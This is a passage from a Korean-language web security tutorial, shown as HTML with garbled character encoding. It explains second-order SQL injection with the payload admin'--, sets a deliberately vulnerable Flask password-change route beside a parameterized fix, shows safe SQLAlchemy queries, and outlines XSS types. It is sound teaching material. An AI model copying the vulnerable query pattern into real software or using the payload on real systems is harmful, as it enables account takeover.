<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="k">Second</span><span class="o">-</span><span class="k">Order</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Injection</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ë‹¨ê³„</span><span class="w"> </span><span class="mi">1</span><span class="err">:</span><span class="w"> </span><span class="n">ê³µê²©ìê°€</span><span class="w"> </span><span class="n">ì•…ì˜ì ì¸</span><span class="w"> </span><span class="n">ì‚¬ìš©ìëª…ìœ¼ë¡œ</span><span class="w"> </span><span class="n">ë“±ë¡</span><span class="w">                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="nl">Username</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="s1">&#39;--                  â”‚                         â”‚</span>
<span class="s1">â”‚  â”‚ Password: anything                  â”‚                         â”‚</span>
<span class="s1">â”‚  â”‚ [Register]                          â”‚                         â”‚</span>
<span class="s1">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚</span>
<span class="s1">â”‚  â†’ ì‚¬ìš©ìëª… &quot;admin&#39;</span><span class="c1">--&quot;ì´ ë§¤ê°œë³€ìˆ˜í™”ëœ ì¿¼ë¦¬ë¡œ ì•ˆì „í•˜ê²Œ ì €ì¥ë¨       â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ë‹¨ê³„</span><span class="w"> </span><span class="mi">2</span><span class="err">:</span><span class="w"> </span><span class="n">ê³µê²©ìê°€</span><span class="w"> </span><span class="ss">&quot;ë¹„ë°€ë²ˆí˜¸ ë³€ê²½&quot;</span><span class="w"> </span><span class="n">í”Œë¡œìš°ë¥¼</span><span class="w"> </span><span class="n">íŠ¸ë¦¬ê±°</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ì„œë²„</span><span class="w"> </span><span class="n">ì½”ë“œê°€</span><span class="w"> </span><span class="n">ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ</span><span class="w"> </span><span class="n">ì‚¬ìš©ìëª…</span><span class="w"> </span><span class="nl">ê²€ìƒ‰</span><span class="p">:</span><span class="w">                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_current_user</span><span class="p">().</span><span class="n">username</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="ss">&quot;admin&#39;--&quot;</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ì„œë²„ê°€</span><span class="w"> </span><span class="n">ë‹¤ë¥¸</span><span class="w"> </span><span class="n">ì¿¼ë¦¬ì—ì„œ</span><span class="w"> </span><span class="n">ì•ˆì „í•˜ì§€</span><span class="w"> </span><span class="n">ì•Šê²Œ</span><span class="w"> </span><span class="nl">ì‚¬ìš©</span><span class="p">:</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;new_hash&#39;</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39;                                   â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nl">ê²°ê³¼</span><span class="p">:</span><span class="w"> </span><span class="n">ìì‹ ì˜</span><span class="w"> </span><span class="n">ë¹„ë°€ë²ˆí˜¸ê°€</span><span class="w"> </span><span class="n">ì•„ë‹Œ</span><span class="w"> </span><span class="n">ADMINì˜</span><span class="w"> </span><span class="n">ë¹„ë°€ë²ˆí˜¸ë¥¼</span><span class="w"> </span><span class="n">ë³€ê²½</span><span class="err">!</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ì²«</span><span class="w"> </span><span class="n">ë²ˆì§¸</span><span class="w"> </span><span class="n">ì¿¼ë¦¬ëŠ”</span><span class="w"> </span><span class="n">ì•ˆì „í–ˆì§€ë§Œ</span><span class="w"> </span><span class="n">ë‘</span><span class="w"> </span><span class="n">ë²ˆì§¸ëŠ”</span><span class="w"> </span><span class="n">ê·¸ë ‡ì§€</span><span class="w"> </span><span class="n">ì•Šì•˜ìŒ</span><span class="p">.</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nl">ë°©ì–´</span><span class="p">:</span><span class="w"> </span><span class="n">ìì²´</span><span class="w"> </span><span class="n">ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ</span><span class="w"> </span><span class="n">ê²€ìƒ‰í•œ</span><span class="w"> </span><span class="n">ë°ì´í„°ë¥¼</span><span class="w"> </span><span class="n">ì‚¬ìš©í•˜ëŠ”</span><span class="w"> </span><span class="n">ì¿¼ë¦¬ë¥¼</span><span class="w"> </span><span class="n">í¬í•¨</span><span class="w">  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">í•˜ì—¬</span><span class="w"> </span><span class="n">ëª¨ë“ </span><span class="w"> </span><span class="n">ì¿¼ë¦¬ë¥¼</span><span class="w"> </span><span class="n">ë§¤ê°œë³€ìˆ˜í™”</span><span class="p">.</span><span class="w">                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="c1"># ì·¨ì•½: Second-order SQL injection</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/change-password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">change_password_vulnerable</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">get_current_user</span><span class="p">()</span>  <span class="c1"># DBì—ì„œ ê²€ìƒ‰</span>
    <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;new_password&#39;</span><span class="p">]</span>
    <span class="n">new_hash</span> <span class="o">=</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">new_password</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># ì·¨ì•½: DBì—ì„œ ê°€ì ¸ì˜¨ usernameì„ ë§¤ê°œë³€ìˆ˜í™” ì—†ì´ ì‚¬ìš©!</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;UPDATE users SET password_hash = &#39;</span><span class="si">{</span><span class="n">new_hash</span><span class="si">}</span><span class="s2">&#39; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;WHERE username = &#39;</span><span class="si">{</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span>  <span class="c1"># user.username = &quot;admin&#39;--&quot;</span>
    <span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;updated&quot;</span><span class="p">})</span>


<span class="c1"># ìˆ˜ì •: ìì²´ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ê°€ì ¸ì˜¨ ë°ì´í„°ë„ ë§¤ê°œë³€ìˆ˜í™”</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/change-password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">change_password_secure</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">get_current_user</span><span class="p">()</span>
    <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;new_password&#39;</span><span class="p">]</span>
    <span class="n">new_hash</span> <span class="o">=</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">new_password</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="s2">&quot;UPDATE users SET password_hash = ? WHERE id = ?&quot;</span><span class="p">,</span>
        <span class="p">(</span><span class="n">new_hash</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>  <span class="c1"># ì‚¬ìš©ìëª…ì´ ì•„ë‹Œ ì‚¬ìš©ì ID(ì •ìˆ˜) ì‚¬ìš©</span>
    <span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;updated&quot;</span><span class="p">})</span>
</code></pre></div>

<h3 id="24-sqlalchemy-orm">2.4 SQLAlchemy ORM (ê¶Œì¥ ë°©ë²•)<a class="header-link" href="#24-sqlalchemy-orm" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">sqlalchemy_safe.py - ìë™ ë§¤ê°œë³€ìˆ˜í™”ë¥¼ ìœ„í•œ SQLAlchemy ORM ì‚¬ìš©</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask_sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">SQLAlchemy</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///app.db&#39;</span>
<span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>


<span class="k">class</span><span class="w"> </span><span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">80</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">120</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">password_hash</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>


<span class="k">class</span><span class="w"> </span><span class="nc">Product</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">200</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">price</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Float</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">description</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Text</span><span class="p">)</span>


<span class="c1"># ì•ˆì „: ORM ì¿¼ë¦¬ëŠ” ìë™ìœ¼ë¡œ ë§¤ê°œë³€ìˆ˜í™”ë¨</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ORMì´ ë§¤ê°œë³€ìˆ˜í™” ì²˜ë¦¬</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">verify_password</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">password_hash</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;logged in&quot;</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/search&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ì•ˆì „: SQLAlchemyê°€ ë§¤ê°œë³€ìˆ˜í™”</span>
    <span class="n">products</span> <span class="o">=</span> <span class="n">Product</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span>
        <span class="n">Product</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">ilike</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s1">%&#39;</span><span class="p">)</span>
    <span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([{</span>
        <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
        <span class="s2">&quot;price&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">price</span>
    <span class="p">}</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">products</span><span class="p">])</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/products&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">list_products</span><span class="p">():</span>
    <span class="c1"># ì•ˆì „: ì •ë ¬ì„ ìœ„í•œ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ + ORM</span>
    <span class="n">sort_column</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>
    <span class="n">sort_order</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;order&#39;</span><span class="p">,</span> <span class="s1">&#39;asc&#39;</span><span class="p">)</span>

    <span class="n">ALLOWED_COLUMNS</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">Product</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
        <span class="s1">&#39;price&#39;</span><span class="p">:</span> <span class="n">Product</span><span class="o">.</span><span class="n">price</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">column</span> <span class="o">=</span> <span class="n">ALLOWED_COLUMNS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">sort_column</span><span class="p">,</span> <span class="n">Product</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">sort_order</span> <span class="o">==</span> <span class="s1">&#39;desc&#39;</span><span class="p">:</span>
        <span class="n">column</span> <span class="o">=</span> <span class="n">column</span><span class="o">.</span><span class="n">desc</span><span class="p">()</span>

    <span class="n">products</span> <span class="o">=</span> <span class="n">Product</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">order_by</span><span class="p">(</span><span class="n">column</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="s2">&quot;price&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">price</span><span class="p">}</span>
                    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">products</span><span class="p">])</span>


<span class="c1"># ê²½ê³ : ORMì˜ raw SQLë„ ì—¬ì „íˆ ì·¨ì•½í•  ìˆ˜ ìˆìŒ!</span>

<span class="c1"># ì·¨ì•½: raw SQL ë¬¸ìì—´ í¬ë§¤íŒ…</span>
<span class="c1"># db.session.execute(f&quot;SELECT * FROM users WHERE name = &#39;{name}&#39;&quot;)</span>

<span class="c1"># ì•ˆì „: ë§¤ê°œë³€ìˆ˜ê°€ ìˆëŠ” raw SQL</span>
<span class="c1"># db.session.execute(text(&quot;SELECT * FROM users WHERE name = :name&quot;),</span>
<span class="c1">#                    {&quot;name&quot;: name})</span>
</code></pre></div>

<hr />
<h2 id="3-cross-site-scripting-xss">3. Cross-Site Scripting (XSS)<a class="header-link" href="#3-cross-site-scripting-xss" title="Permanent link">&para;</a></h2>
<h3 id="31-xss">3.1 XSS ê°œìš”<a class="header-link" href="#31-xss" title="Permanent link">&para;</a></h3>
<p>XSSëŠ” ê³µê²©ìê°€ ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ë³´ëŠ” ì›¹ í˜ì´ì§€ì— ì•…ì˜ì ì¸ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ëŠ” ì •ìƒ í˜ì´ì§€ì™€ ë™ì¼í•œ ê¶Œí•œìœ¼ë¡œ í”¼í•´ìì˜ ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              Cross-Site Scripting (XSS) ìœ í˜•                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  1. Reflected XSS (Type 1)                                      â”‚
â”‚     í˜ì´ë¡œë“œê°€ ìš”ì²­(URL, í¼ ë°ì´í„°)ì— ìˆìŒ                        â”‚
â”‚     ì„œë²„ê°€ ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ ì‘ë‹µì— í¬í•¨                            â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”                           â”‚
â”‚     â”‚í”¼í•´ìâ”‚â”€â”€â”€â–¶â”‚ì„œë²„  â”‚â”€â”€â”€â–¶â”‚í”¼í•´ìâ”‚                           â”‚
â”‚     â”‚ë§í¬  â”‚    â”‚ì…ë ¥  â”‚    â”‚ìŠ¤í¬ë¦½â”‚                            â”‚
â”‚     â”‚í´ë¦­  â”‚    â”‚ë°˜í–¥  â”‚    â”‚íŠ¸ì‹¤í–‰â”‚                            â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”˜                           â”‚
â”‚                                                                  â”‚
â”‚  2. Stored XSS (Type 2)                                         â”‚
â”‚     í˜ì´ë¡œë“œê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥ë¨ (ëŒ“ê¸€, í”„ë¡œí•„ ë“±)             â”‚
â”‚     í•´ë‹¹ í˜ì´ì§€ë¥¼ ë³´ëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ ì œê³µë¨                      â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”            â”‚
â”‚     â”‚ê³µê²©ì  â”‚â”€â”€â”€â–¶â”‚ì„œë²„  â”‚    â”‚ì„œë²„  â”‚â”€â”€â”€â–¶â”‚í”¼í•´ìâ”‚            â”‚
â”‚     â”‚í˜ì´ë¡œë“œâ”‚    â”‚DBì—  â”‚    â”‚DBì—ì„œâ”‚    â”‚ìŠ¤í¬ë¦½â”‚            â”‚
â”‚     â”‚ì €ì¥    â”‚    â”‚ì €ì¥  â”‚    â”‚ì œê³µ  â”‚    â”‚íŠ¸ì‹¤í–‰â”‚            â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                                  â”‚
â”‚  3. DOM-Based XSS (Type 0)                                      â”‚
â”‚     í˜ì´ë¡œë“œê°€ ì„œë²„ì— ë„ë‹¬í•˜ì§€ ì•ŠìŒ                               â”‚
â”‚     í˜ì´ì§€ì˜ JavaScriptê°€ URL/DOMì—ì„œ ê³µê²©ì ì…ë ¥ì„ ì½ê³           â”‚
â”‚     ì•ˆì „í•˜ì§€ ì•Šê²Œ ì‚½ì…                                            â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”                     â”Œâ”€â”€â”€â”€â”€â”€â”                      â”‚
â”‚     â”‚í”¼í•´ìâ”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚í´ë¼ì´â”‚                      â”‚
â”‚     â”‚ë§í¬  â”‚  URL fragment (#)   â”‚ì–¸íŠ¸JSâ”‚                      â”‚
â”‚     â”‚í´ë¦­  â”‚  ë˜ëŠ” DOM ì†ì„±      â”‚ì½ê³   â”‚                      â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”˜                     â”‚ì‚½ì…  â”‚                      â”‚
â”‚                                  â””â”€â”€â”€â”€â”€â”€â”˜                      â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="32-reflected-xss">3.2 Reflected XSS<a class="header-link" href="#32-reflected-xss" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">xss_reflected.py - Reflected XSS ì·¨ì•½ì ê³¼ ìˆ˜ì •</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">Markup</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="c1"># ==============================================================</span>
